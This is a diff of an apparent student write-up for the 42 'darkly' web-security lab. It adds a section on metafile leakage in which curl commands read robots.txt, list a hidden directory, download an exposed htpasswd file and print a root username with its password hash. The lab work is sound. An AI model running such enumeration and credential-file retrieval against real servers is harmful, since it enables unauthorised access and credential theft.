@@ -151,13 +151,44 @@ perl: warning: Falling back to a fallback locale ("en_US.UTF-8").
 ```
 </details>
 
-[`robots.txt`](https://www.robotstxt.org/robotstxt.html) lies on the server that contains instructions about the server.
-
-It reveals that `/whatever` and `/.hidden` directories are present on the server.
-
 ## Remediation
 Exposing server information can lead attacker to find version-specific vulnerabilities that can be used.
 
 It is recommended to :
 - Obscure web server information in headers
 - Use proxy server to leave client with no knowledge of the web server behind
+
+## [WSTG-INFO-03] Web server metafiles & information leakage
+In previous section, Automated Scanning Tools showed that [`robots.txt`](https://www.robotstxt.org/robotstxt.html) lies on the server that contains instructions about the server.
+```sh
+┌──$ [~/42/2022/darkly]
+└─>  curl http://192.168.56.101/robots.txt
+User-agent: *
+Disallow: /whatever
+Disallow: /.hidden
+```
+It reveals that `/whatever` and `/.hidden` directories are present on the server.
+
+[`/whatever`](http://192.168.56.101/whatever) contains a file name [`htpasswd`](http://192.168.56.101/whatever/htpasswd).
+```sh
+┌──$ [~/42/2022/darkly]
+└─>  curl http://192.168.56.101/whatever/
+<html>
+<head><title>Index of /whatever/</title></head>
+<body bgcolor="white">
+<h1>Index of /whatever/</h1><hr><pre><a href="../">../</a>
+<a href="htpasswd">htpasswd</a>                                           29-Jun-2021 18:09                  38
+</pre><hr></body>
+</html>
+┌──$ [~/42/2022/darkly]
+└─>  curl -LO http://192.168.56.101/whatever/htpasswd
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    38  100    38    0     0   5727      0 --:--:-- --:--:-- --:--:--  6333
+┌──$ [~/42/2022/darkly]
+└─>  file htpasswd
+htpasswd: ASCII text
+┌──$ [~/42/2022/darkly]
+└─>  cat htpasswd
+root:437394baff5aa33daa618be47b75cb49
+```
